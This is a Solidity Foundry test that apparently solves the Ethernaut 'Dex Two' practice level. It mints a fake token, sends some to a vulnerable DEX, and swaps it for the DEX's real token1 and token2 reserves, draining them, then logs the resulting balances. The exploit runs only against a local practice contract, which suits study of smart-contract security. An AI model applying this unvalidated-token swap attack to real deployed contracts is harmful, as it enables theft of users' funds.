// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Dex2.sol";

contract test_solution is Test {
    DexTwo dex;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    SwappableTokenTwo dtoken;

    address player = makeAddr("player");

    function setUp() public {
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "token1", "t1", 10000);
        token2 = new SwappableTokenTwo(address(dex), "token2", "t2", 10000);
        dtoken = new SwappableTokenTwo(address(dex), "dtoken", "dt", 10000);

        dex.setTokens(address(token1), address(token2));

        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);

        token1.transfer(player, 10);
        token2.transfer(player, 10);
        dtoken.transfer(player, 10000);

        vm.deal(player, 1 ether);
    }

    function test_dextwo() public {
        vm.startPrank(player);
        dex.approve(address(dex), 1000000000000);
        dtoken.approve(player, address(dex), 10000000000);
        dtoken.transfer(address(dex), 10);
        dex.swap(address(dtoken), address(token1), 10);

        dex.swap(address(dtoken), address(token2), 20);

        console.log("current balance token1/player", token1.balanceOf(player));
        console.log("current balance token2/player", token2.balanceOf(player));
        console.log("current balance token1/dex", token1.balanceOf(address(dex)));
        console.log("current balance token2/dex", token2.balanceOf(address(dex)));
    }
}
